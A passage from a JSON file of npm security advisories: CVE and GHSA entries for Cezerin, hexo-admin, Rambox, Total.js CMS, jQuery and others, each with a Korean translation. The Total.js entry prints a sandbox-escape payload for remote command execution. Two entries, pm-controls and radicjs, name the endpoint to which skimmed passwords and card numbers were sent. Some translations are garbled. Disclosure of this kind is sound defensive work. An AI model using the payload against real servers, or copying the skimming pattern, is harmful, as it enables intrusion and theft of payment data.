    "descriptionKR": "Node.js용 BSON ObjectID(일명 bson-objectid) 패키지 1.3.0에서 문제가 발견되었습니다. ObjectID()를 사용하면 공격자가 사용자 입력에 추가 속성을 삽입하여 잘못된 형식의 objectid를 생성할 수 있습니다. bson-objectid는 사용자 입력 개체에서 `detect _bsontype==ObjectID`인 경우 일찍 반환하기 때문입니다. 결과적으로 임의 형식의 개체는 유효한 bsontype이 있는 경우 서식을 무시할 수 있습니다."
  },
  {
    "description": "Cezerin v0.33.0 allows unauthorized order-information modification because certain internal attributes can be overwritten via a conflicting name when processing order requests. Hence, a malicious customer can manipulate an order (e.g., its payment status or shipping fee) by adding additional attributes to user-input during the PUT `/ajax/cart` operation for a checkout, because of `getValidDocumentForUpdate` in `api/server/services/orders/orders.js`.",
    "identifiers": "GHSA : GHSA-6pq6-crw9-522h\nCVE : CVE-2019-18608",
    "severity": "HIGH",
    "updatedAt": "2023-07-18T20:46:18Z",
    "publishedAt": "2022-05-24T17:00:04Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-18608\nhttps://github.com/cl0udz/vulnerabilities/blob/master/cezerin-manipulate_order_information/README.md\nhttps://github.com/advisories/GHSA-6pq6-crw9-522h",
    "name": "cezerin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.33.0",
    "descriptionKR": "Cezerin v0.33.0은 주문 요청을 처리할 때 충돌하는 이름을 통해 특정 내부 속성을 덮어쓸 수 있기 때문에 승인되지 않은 주문 정보 수정을 허용합니다. 따라서 악의적인 고객은 'api/'의 'getValidDocumentForUpdate' 때문에 체크아웃을 위한 PUT `/ajax/cart` 작업 중에 사용자 입력에 추가 속성을 추가하여 주문(예: 결제 상태 또는 배송비)을 조작할 수 있습니다. 서버/서비스/주문/orders.js`."
  },
  {
    "description": "The Post editor functionality in the hexo-admin plugin versions 2.3.0 and earlier for Node.js is vulnerable to stored XSS via the content of a post.",
    "identifiers": "GHSA : GHSA-g784-q3p3-26rm\nCVE : CVE-2019-17606",
    "severity": "MODERATE",
    "updatedAt": "2023-07-18T20:38:57Z",
    "publishedAt": "2022-05-24T16:59:45Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-17606\nhttps://github.com/jaredly/hexo-admin/issues/185\nhttps://github.com/418sec/hexo-admin/pull/2\nhttps://github.com/jaredly/hexo-admin/pull/203\nhttps://github.com/advisories/GHSA-g784-q3p3-26rm",
    "name": "hexo-admin",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.3.0",
    "descriptionKR": "Node.js용 hexo-admin 플러그인 버전 2.3.0 및 이전 버전의 게시물 편집기 기능은 게시물 콘텐츠를 통해 저장된 XSS에 취약합니다."
  },
  {
    "description": "There is a stored XSS in Rambox 0.6.9 that can lead to code execution. The XSS is in the name field while adding/editing a service. The problem occurs due to incorrect sanitization of the name field when being processed and stored. This allows a user to craft a payload for Node.js and Electron, such as an exec of OS commands within the onerror attribute of an IMG element.",
    "identifiers": "GHSA : GHSA-2gc6-2h2g-ph48\nCVE : CVE-2019-17625",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-18T20:31:11Z",
    "publishedAt": "2022-05-24T16:58:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-17625\nhttps://github.com/Ekultek/CVE-2019-17625/\nhttps://web.archive.org/web/20211209122051/https://github.com/ramboxapp/community-edition/issues/2418\nhttps://github.com/advisories/GHSA-2gc6-2h2g-ph48",
    "name": "Rambox",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.6.9",
    "descriptionKR": "Rambox 0.6.9에는 코드 실행으로 이어질 수 있는 저장된 XSS가 있습니다. XSS는 서비스를 추가/수정하는 동안 이름 필드에 있습니다. 처리 및 저장시 이름 필드의 잘못된 정리로 인해 문제가 발생합니다. 이를 통해 사용자는 IMG 요소의 onerror 속성 내에서 OS 명령의 exec와 같은 Node.js 및 Electron에 대한 페이로드를 만들 수 있습니다."
  },
  {
    "description": "All versions of the package word-wrap are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within the result variable.\n",
    "identifiers": "GHSA : GHSA-j8xg-fqg3-53r7\nCVE : CVE-2023-26115",
    "severity": "MODERATE",
    "updatedAt": "2023-07-18T19:55:50Z",
    "publishedAt": "2023-06-22T06:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26115\nhttps://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-4058657\nhttps://security.snyk.io/vuln/SNYK-JS-WORDWRAP-3149973\nhttps://github.com/jonschlinkert/word-wrap/blob/master/index.js#L39\nhttps://github.com/jonschlinkert/word-wrap/releases/tag/1.2.4\nhttps://github.com/advisories/GHSA-j8xg-fqg3-53r7",
    "name": "word-wrap",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.2.4",
    "identifier": "1.2.4",
    "descriptionKR": "word-wrap 패키지의 모든 버전은 결과 변수 내에서 안전하지 않은 정규식을 사용하기 때문에 ReDoS(정규식 서비스 거부)에 취약합니다."
  },
  {
    "description": "### Description\n\nThe Export Chat feature includes certain attacker-controlled elements in the generated document without sufficient escaping, leading to stored XSS.\n\n### Impact\n\nSince the Export Chat feature generates a separate document, an attacker can only inject code run from the `null` origin, restricting the impact.\n\nHowever, the attacker can still potentially use the XSS to leak message contents. A malicious homeserver is a potential attacker since the affected inputs are controllable server-side.\n\n### Patches\nThis was patched in matrix-react-sdk 3.76.0.\n\n### Workarounds\nNone, other than not using the Export Chat feature.\n\n### References\nN/A\n",
    "identifiers": "GHSA : GHSA-c9vx-2g7w-rp65\nCVE : CVE-2023-37259",
    "severity": "MODERATE",
    "updatedAt": "2023-07-19T20:04:38Z",
    "publishedAt": "2023-07-18T16:58:01Z",
    "references": "https://github.com/matrix-org/matrix-react-sdk/security/advisories/GHSA-c9vx-2g7w-rp65\nhttps://github.com/matrix-org/matrix-react-sdk/commit/22fcd34c606f32129ebc967fc21f24fb708a98b8\nhttps://github.com/matrix-org/matrix-react-sdk/releases/tag/v3.76.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-37259\nhttps://github.com/advisories/GHSA-c9vx-2g7w-rp65",
    "name": "matrix-react-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.32.0, < 3.76.0",
    "identifier": "3.76.0",
    "descriptionKR": "### 설명\n\n채팅 내보내기 기능에는 생성된 문서에 공격자가 제어하는 ​​특정 요소가 포함되어 있으므로 XSS가 저장됩니다.\n\n### 영향\n\n채팅 내보내기 기능은 별도의 문서를 생성하기 때문에 공격자는 `null` 원본에서 실행되는 코드만 삽입할 수 있어 영향을 제한할 수 있습니다.\n\n그러나 공격자는 여전히 잠재적으로 XSS를 사용하여 메시지 내용을 유출할 수 있습니다. 영향을 받는 입력이 서버 측에서 제어 가능하므로 악의적인 홈 서버는 잠재적인 공격자입니다.\n\n### 패치\n이는 matrix-react-sdk 3.76.0에서 패치되었습니다.\n\n### 해결 방법\n채팅 내보내기 기능을 사용하지 않는 것 외에는 없음.\n\n### 참조\n해당 없음"
  },
  {
    "description": "An issue was discovered in Total.js CMS 12.0.0. An authenticated user with the Pages privilege can conduct a path traversal attack (../) to include .html files that are outside the permitted directory. Also, if a page contains a template directive, then the directive will be server side processed. Thus, if a user can control the content of a .html file, then they can inject a payload with a malicious template directive to gain Remote Command Execution. The exploit will work only with the .html extension.",
    "identifiers": "GHSA : GHSA-pwvp-h579-hfxg\nCVE : CVE-2019-15952",
    "severity": "HIGH",
    "updatedAt": "2023-07-17T23:19:50Z",
    "publishedAt": "2022-05-24T16:55:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-15952\nhttps://github.com/beerpwn/CVE/blob/master/Totaljs_disclosure_report/report_final.pdf\nhttps://seclists.org/fulldisclosure/2019/Sep/2\nhttps://github.com/advisories/GHSA-pwvp-h579-hfxg",
    "name": "total4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 12.0",
    "descriptionKR": "Total.js CMS 12.0.0에서 문제가 발견되었습니다. Pages 권한이 있는 인증된 사용자는 허용된 디렉터리 외부에 있는 .html 파일을 포함하도록 경로 순회 공격(../)을 수행할 수 있습니다. 또한 페이지에 템플릿 지시문이 포함되어 있으면 지시문이 서버 측에서 처리됩니다. 따라서 사용자가 .html 파일의 내용을 제어할 수 있는 경우 원격 명령 실행을 얻기 위해 악성 템플릿 지시문이 포함된 페이로드를 주입할 수 있습니다. 익스플로잇은 .html 확장자에서만 작동합니다."
  },
  {
    "description": "An issue was discovered in Total.js CMS 12.0.0. An authenticated user with limited privileges can get access to a resource that they do not own by calling the associated API. The product correctly manages privileges only for the front-end resource path, not for API requests. This leads to vertical and horizontal privilege escalation.",
    "identifiers": "GHSA : GHSA-q3x9-28f7-w8rc\nCVE : CVE-2019-15953",
    "severity": "HIGH",
    "updatedAt": "2023-07-17T23:17:34Z",
    "publishedAt": "2022-05-24T16:55:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-15953\nhttps://github.com/beerpwn/CVE/blob/master/Totaljs_disclosure_report/report_final.pdf\nhttps://seclists.org/fulldisclosure/2019/Sep/6\nhttps://github.com/advisories/GHSA-q3x9-28f7-w8rc",
    "name": "total4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 12.0",
    "descriptionKR": "Total.js CMS 12.0.0에서 문제가 발견되었습니다. 제한된 권한을 가진 인증된 사용자는 연결된 API를 호출하여 소유하지 않은 리소스에 대한 액세스 권한을 얻을 수 있습니다. 제품은 API 요청이 아닌 프런트 엔드 리소스 경로에 대해서만 권한을 올바르게 관리합니다. 이로 인해 수직 및 수평 권한 에스컬레이션이 발생합니다."
  },
  {
    "description": "An issue was discovered in Total.js CMS 12.0.0. An authenticated user with the widgets privilege can gain achieve Remote Command Execution (RCE) on the remote server by creating a malicious widget with a special tag containing JavaScript code that will be evaluated server side. In the process of evaluating the tag by the back-end, it is possible to escape the sandbox object by using the following payload: `<script total>global.process.mainModule.require(child_process).exec(RCE);</script>`",
    "identifiers": "GHSA : GHSA-v287-9w3v-x5c5\nCVE : CVE-2019-15954",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-17T23:14:58Z",
    "publishedAt": "2022-05-24T16:55:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-15954\nhttps://github.com/beerpwn/CVE/blob/master/Totaljs_disclosure_report/report_final.pdf\nhttps://seclists.org/fulldisclosure/2019/Sep/5\nhttp://packetstormsecurity.com/files/154924/Total.js-CMS-12-Widget-JavaScript-Code-Injection.html\nhttps://github.com/advisories/GHSA-v287-9w3v-x5c5",
    "name": "total4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 12.0.0",
    "descriptionKR": "Total.js CMS 12.0.0에서 문제가 발견되었습니다. 위젯 권한이 있는 인증된 사용자는 서버 측에서 평가될 JavaScript 코드가 포함된 특수 태그가 포함된 악성 위젯을 생성하여 원격 서버에서 원격 명령 실행(RCE)을 달성할 수 있습니다. 백엔드에서 태그를 평가하는 과정에서 `<script total>global.process.mainModule.require(child_process).exec(RCE);</ 페이로드를 사용하여 샌드박스 개체를 이스케이프할 수 있습니다. 스크립트>`"
  },
  {
    "description": "An issue was discovered in the mysql (aka mysqljs) module 2.17.1 for Node.js. `The LOAD DATA LOCAL INFILE` option is open by default.",
    "identifiers": "GHSA : GHSA-f982-mxwc-3mrx\nCVE : CVE-2019-14939",
    "severity": "MODERATE",
    "updatedAt": "2023-07-17T18:54:11Z",
    "publishedAt": "2022-05-24T16:53:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-14939\nhttps://github.com/mysqljs/mysql/issues/2471\nhttps://github.com/mysqljs/mysql/commit/337e87ae5fcea3667864197c65dc758517fcde06\nhttps://bugs.debian.org/cgi-bin/bugreport.cgi?bug=934712&gt\nhttps://web.archive.org/web/20190812004403/https://github.com/mysqljs/mysql/issues/2257\nhttps://github.com/advisories/GHSA-f982-mxwc-3mrx",
    "name": "mysql",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 2.17.1",
    "identifier": "2.18.0",
    "descriptionKR": "Node.js용 mysql(mysqljs라고도 함) 모듈 2.17.1에서 문제가 발견되었습니다. LOAD DATA LOCAL INFILE' 옵션은 기본적으로 열려 있습니다."
  },
  {
    "description": "An issue was discovered in xdLocalStorage through 2.0.5. The `postData()` function in `xdLocalStoragePostMessageApi.js` specifies the wildcard (`*`) as the targetOrigin when calling the `postMessage()` function on the parent object. Therefore any domain can load the application hosting the \"magical iframe\" and receive the messages that the \"magical iframe\" sends.",
    "identifiers": "GHSA : GHSA-mr5m-2385-2vcp\nCVE : CVE-2020-11610",
    "severity": "HIGH",
    "updatedAt": "2023-07-17T18:29:37Z",
    "publishedAt": "2022-05-24T17:13:39Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-11610\nhttps://grimhacker.com/exploiting-xdlocalstorage-localstorage-and-postmessage/#Missing-TargetOrigin-Magic-iframe\nhttps://github.com/ofirdagan/cross-domain-local-storage/issues/17\nhttps://github.com/ofirdagan/cross-domain-local-storage/pull/19\nhttps://github.com/advisories/GHSA-mr5m-2385-2vcp",
    "name": "xdlocalstorage",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.0.5",
    "descriptionKR": "2.0.5를 통해 xdLocalStorage에서 문제가 발견되었습니다. `xdLocalStoragePostMessageApi.js`의 `postData()` 함수는 상위 객체에서 `postMessage()` 함수를 호출할 때 targetOrigin으로 와일드카드(`*`)를 지정합니다. 따라서 모든 도메인은 \"magical iframe\"을 호스팅하는 애플리케이션을 로드하고 \"magical iframe\"이 보내는 메시지를 받을 수 있습니다."
  },
  {
    "description": "jQuery from 1.1.4 until 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles `jQuery.extend(true, {}, ...)` because of `Object.prototype` pollution. If an unsanitized source object contained an enumerable `__proto__` property, it could extend the native `Object.prototype`.",
    "identifiers": "GHSA : GHSA-6c3j-c64m-qhgq\nCVE : CVE-2019-11358",
    "severity": "MODERATE",
    "updatedAt": "2023-07-17T11:22:24Z",
    "publishedAt": "2019-04-26T16:29:11Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-11358\nhttps://backdropcms.org/security/backdrop-sa-core-2019-009\nhttps://blog.jquery.com/2019/04/10/jquery-3-4-0-released/\nhttps://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b\nhttps://github.com/jquery/jquery/pull/4333\nhttps://snyk.io/vuln/SNYK-JS-JQUERY-174006\nhttps://www.drupal.org/sa-core-2019-006\nhttps://access.redhat.com/errata/RHSA-2019:3023\nhttps://access.redhat.com/errata/RHSA-2019:3024\nhttps://lists.apache.org/thread.html/08720ef215ee7ab3386c05a1a90a7d1c852bf0706f176a7816bf65fc@%3Ccommits.airflow.apache.org%3E\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/5928aa293e39d248266472210c50f176cac1535220f2486e6a7fa844@%3Ccommits.airflow.apache.org%3E\nhttps://lists.apache.org/thread.html/6097cdbd6f0a337bedd9bb5cc441b2d525ff002a96531de367e4259f@%3Ccommits.airflow.apache.org%3E\nhttps://lists.apache.org/thread.html/88fb0362fd40e5b605ea8149f63241537b8b6fb5bfa315391fc5cbb7@%3Ccommits.airflow.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/b736d0784cf02f5a30fbb4c5902762a15ad6d47e17e2c5a17b7d6205@%3Ccommits.airflow.apache.org%3E\nhttps://lists.apache.org/thread.html/ba79cf1658741e9f146e4c59b50aee56656ea95d841d358d006c18b6@%3Ccommits.roller.apache.org%3E\nhttps://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/r38f0d1aa3c923c22977fe7376508f030f22e22c1379fbb155bf29766@%3Cdev.syncope.apache.org%3E\nhttps://lists.apache.org/thread.html/r7aac081cbddb6baa24b75e74abf0929bf309b176755a53e3ed810355@%3Cdev.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/rac25da84ecdcd36f6de5ad0d255f4e967209bbbebddb285e231da37d@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E\nhttps://lists.debian.org/debian-lts-announce/2019/05/msg00006.html\nhttps://lists.debian.org/debian-lts-announce/2019/05/msg00029.html\nhttps://lists.debian.org/debian-lts-announce/2020/02/msg00024.html\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4UOAZIFCSZ3ENEFOR5IXX6NFAD3HV7FA/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5IABSKTYZ5JUGL735UKGXL5YPRYOPUYI/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KYH3OAGR2RTCHRA5NOKX2TES7SNQMWGO/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QV3PKZC3PQCO3273HAT76PAQZFBEO4KP/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RLXRX23725JL366CNZGJZ7AQQB7LHQ6F/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WZW27UCJ5CYFL4KFFFMYMIBNMIU2ALG5/\nhttps://security.netapp.com/advisory/ntap-20190919-0001/\nhttps://www.debian.org/security/2019/dsa-4434\nhttps://www.debian.org/security/2019/dsa-4460\nhttps://www.synology.com/security/advisory/Synology_SA_19_19\nhttps://www.tenable.com/security/tns-2019-08\nhttps://www.tenable.com/security/tns-2020-02\nhttp://lists.opensuse.org/opensuse-security-announce/2019-08/msg00006.html\nhttp://lists.opensuse.org/opensuse-security-announce/2019-08/msg00025.html\nhttp://packetstormsecurity.com/files/152787/dotCMS-5.1.1-Vulnerable-Dependencies.html\nhttp://packetstormsecurity.com/files/153237/RetireJS-CORS-Issue-Script-Execution.html\nhttp://packetstormsecurity.com/files/156743/OctoberCMS-Insecure-Dependencies.html\nhttp://www.openwall.com/lists/oss-security/2019/06/03/2\nhttps://lists.apache.org/thread.html/r2041a75d3fc09dec55adfd95d598b38d22715303f65c997c054844c9@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/r2baacab6e0acb5a2092eb46ae04fd6c3e8277b4fd79b1ffb7f3254fa@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/r41b5bfe009c845f67d4f68948cc9419ac2d62e287804aafd72892b08@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/r7e8ebccb7c022e41295f6fdb7b971209b83702339f872ddd8cf8bf73@%3Cissues.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/r7d64895cc4dff84d0becfc572b20c0e4bf9bfa7b10c6f5f73e783734@%3Cdev.storm.apache.org%3E\nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601\nhttps://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#434\nhttps://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2019-11358.yml\nhttps://security.snyk.io/vuln/SNYK-DOTNET-JQUERY-450226\nhttps://access.redhat.com/errata/RHBA-2019:1570\nhttps://access.redhat.com/errata/RHSA-2019:1456\nhttps://access.redhat.com/errata/RHSA-2019:2587\nhttps://seclists.org/bugtraq/2019/Apr/32\nhttps://seclists.org/bugtraq/2019/Jun/12\nhttps://seclists.org/bugtraq/2019/May/18\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://www.oracle.com/security-alerts/cpuApr2021.html\nhttps://www.oracle.com/security-alerts/cpuapr2020.html\nhttps://www.oracle.com/security-alerts/cpujan2020.html\nhttps://www.oracle.com/security-alerts/cpujan2021.html\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://www.oracle.com/security-alerts/cpujul2020.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html\nhttps://www.privacy-wise.com/mitigating-cve-2019-11358-in-old-versions-of-jquery/\nhttp://seclists.org/fulldisclosure/2019/May/10\nhttp://seclists.org/fulldisclosure/2019/May/11\nhttp://seclists.org/fulldisclosure/2019/May/13\nhttps://supportportal.juniper.net/s/article/2021-07-Security-Bulletin-Junos-OS-Multiple-J-Web-vulnerabilities-resolved-in-Junos-OS-21-2R1\nhttps://web.archive.org/web/20190824065237/http://www.securityfocus.com/bid/108023\nhttps://github.com/advisories/GHSA-6c3j-c64m-qhgq",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.1.4, < 3.4.0",
    "identifier": "3.4.0",
    "descriptionKR": "Drupal, Backdrop CMS 및 기타 제품에서 사용되는 jQuery 1.1.4부터 3.4.0까지는 `Object.prototype` 오염으로 인해 `jQuery.extend(true, {}, ...)`를 잘못 처리합니다. 정리되지 않은 소스 개체에 열거 가능한 `__proto__` 속성이 포함된 경우 기본 `Object.prototype`을 확장할 수 있습니다."
  },
  {
    "description": "A vulnerability, which was classified as problematic, was found in layui up to v2.8.0-rc.16. This affects an unknown part of the component HTML Attribute Handler. The manipulation of the argument title leads to cross site scripting. It is possible to initiate the attack remotely. Upgrading to version 2.8.0 is able to address this issue. It is recommended to upgrade the affected component. The identifier VDB-234237 was assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-hx4h-676r-j3qp\nCVE : CVE-2023-3691",
    "severity": "MODERATE",
    "updatedAt": "2023-07-26T17:14:47Z",
    "publishedAt": "2023-07-16T18:30:54Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-3691\nhttps://gitee.com/layui/layui/issues/I7HDXZ\nhttps://gitee.com/layui/layui/tree/v2.8.0\nhttps://vuldb.com/?ctiid.234237\nhttps://vuldb.com/?id.234237\nhttps://github.com/advisories/GHSA-hx4h-676r-j3qp",
    "name": "layui",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.8.0",
    "identifier": "2.8.0",
    "descriptionKR": "문제성으로 분류된 취약점이 v2.8.0-rc.16까지 layui에서 발견되었습니다. 이는 구성 요소 HTML 특성 처리기의 알 수 없는 부분에 영향을 미칩니다. 인수 제목을 조작하면 교차 사이트 스크립팅이 발생합니다. 공격을 원격으로 시작할 수 있습니다. 버전 2.8.0으로 업그레이드하면 이 문제를 해결할 수 있습니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. 식별자 VDB-234237이 이 취약점에 할당되었습니다."
  },
  {
    "description": "CleverTap Cordova Plugin version 2.6.2 allows a remote attacker to execute JavaScript code in any application that is opened via a specially constructed deeplink by an attacker.\n\nThis is possible because the plugin does not correctly validate the data coming from the deeplinks before using them.",
    "identifiers": "GHSA : GHSA-x2ph-qqwm-9cc6\nCVE : CVE-2023-2507",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-26T17:15:04Z",
    "publishedAt": "2023-07-15T21:30:16Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-2507\nhttps://fluidattacks.com/advisories/maiden/\nhttps://github.com/CleverTap/clevertap-cordova\nhttps://github.com/advisories/GHSA-x2ph-qqwm-9cc6",
    "name": "clevertap-cordova",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 2.6.2",
    "descriptionKR": "CleverTap Cordova Plugin 버전 2.6.2를 사용하면 공격자가 특별히 구성한 딥링크를 통해 열리는 모든 애플리케이션에서 원격 공격자가 JavaScript 코드를 실행할 수 있습니다.\n\n이것은 플러그인이 딥 링크에서 오는 데이터를 사용하기 전에 올바르게 검증하지 않기 때문에 가능합니다."
  },
  {
    "description": "webmention.js prior to 0.5.5 is vulnerable to cross-site scripting.",
    "identifiers": "GHSA : GHSA-r54g-4qq6-chxg\nCVE : CVE-2023-3672",
    "severity": "HIGH",
    "updatedAt": "2023-07-14T21:50:31Z",
    "publishedAt": "2023-07-14T12:30:20Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-3672\nhttps://github.com/plaidweb/webmention.js/commit/3551b66b3e40da37fee89ecf72930c5efdc53011\nhttps://huntr.dev/bounties/75cfb7ad-a75f-45ff-8688-32a9c55179aa\nhttps://github.com/PlaidWeb/webmention.js/blob/9457e71433c0d2430bbe767ecc5b5837140d0ee4/static/webmention.js#L330\nhttps://github.com/advisories/GHSA-r54g-4qq6-chxg",
    "name": "webmention.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.5.5",
    "identifier": "0.5.5",
    "descriptionKR": "0.5.5 이전의 webmention.js는 교차 사이트 스크립팅에 취약합니다."
  },
  {
    "description": "Auth0 Passport-SharePoint before 0.4.0 does not validate the JWT signature of an Access Token before processing. This allows attackers to forge tokens and bypass authentication and authorization mechanisms.",
    "identifiers": "GHSA : GHSA-45fh-g845-pj9w\nCVE : CVE-2019-13483",
    "severity": "HIGH",
    "updatedAt": "2023-07-14T21:25:27Z",
    "publishedAt": "2022-05-24T16:51:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-13483\nhttps://auth0.com/docs/security/bulletins/cve-2019-13483\nhttps://github.com/advisories/GHSA-45fh-g845-pj9w",
    "name": "passport-sharepoint",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.4.0",
    "identifier": "0.4.0",
    "descriptionKR": "0.4.0 이전의 Auth0 Passport-SharePoint는 처리 전에 액세스 토큰의 JWT 서명을 확인하지 않습니다. 이를 통해 공격자는 토큰을 위조하고 인증 및 권한 부여 메커니즘을 우회할 수 있습니다."
  },
  {
    "description": "In antSword before 2.1.0, self-XSS in the database configuration leads to code execution via `modules/database/asp/index.js`, `modules/database/custom/index.js`, `modules/database/index.js`, or `modules/database/php/index.js`.",
    "identifiers": "GHSA : GHSA-hq75-ggc3-8h3q\nCVE : CVE-2019-13970",
    "severity": "MODERATE",
    "updatedAt": "2023-07-14T21:15:00Z",
    "publishedAt": "2022-05-24T16:50:44Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-13970\nhttps://github.com/AntSwordProject/antSword/issues/151\nhttps://github.com/AntSwordProject/antSword/commit/4b932e81447b4b0475f4fce45525547395c249d3\nhttps://github.com/AntSwordProject/antSword/compare/ed01dea...834063a\nhttps://github.com/advisories/GHSA-hq75-ggc3-8h3q",
    "name": "antsword",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.1.0",
    "identifier": "2.1.0",
    "descriptionKR": "2.1.0 이전의 antSword에서는 데이터베이스 구성의 self-XSS가 `modules/database/asp/index.js`, `modules/database/custom/index.js`, `modules/database/index.js`를 통해 코드 실행으로 이어집니다. js` 또는 `modules/database/php/index.js`."
  },
  {
    "description": "Version 1.1.8 of `pm-controls` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised. Users may downgrade to 1.1.7",
    "identifiers": "GHSA : GHSA-84qj-9qf2-q92r",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-13T21:06:36Z",
    "publishedAt": "2020-09-03T00:32:30Z",
    "references": "https://www.npmjs.com/advisories/949\nhttps://github.com/advisories/GHSA-84qj-9qf2-q92r",
    "name": "pm-controls",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.1.8",
    "descriptionKR": "`pm-controls` 버전 1.1.8에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다. 사용자는 1.1.7로 다운그레이드할 수 있습니다."
  },
  {
    "description": "Version 0.2.1 of `radicjs` contained malicious code. The code when executed in the browser would enumerate password, cvc and cardnumber fields from forms and send the extracted values to `https://js-metrics.com/minjs.php?pl=`\n\n\n\n## Recommendation\n\nRemove the package from your environment and evaluate your application to determine whether or not user data was compromised. Users may downgrade to 0.2.0",
    "identifiers": "GHSA : GHSA-56r9-v65c-34jm",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-13T21:06:00Z",
    "publishedAt": "2020-09-03T02:33:37Z",
    "references": "https://www.npmjs.com/advisories/943\nhttps://github.com/advisories/GHSA-56r9-v65c-34jm",
    "name": "radicjs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.2.1",
    "descriptionKR": "'radicjs' 버전 0.2.1에는 악성 코드가 포함되어 있습니다. 브라우저에서 실행될 때 코드는 양식에서 암호, cvc 및 카드 번호 필드를 열거하고 추출된 값을 `https://js-metrics.com/minjs.php?pl=`로 보냅니다.\n\n\n\n## 추천\n\n환경에서 패키지를 제거하고 애플리케이션을 평가하여 사용자 데이터가 손상되었는지 여부를 확인합니다. 사용자는 0.2.0으로 다운그레이드할 수 있습니다."
  },
  {
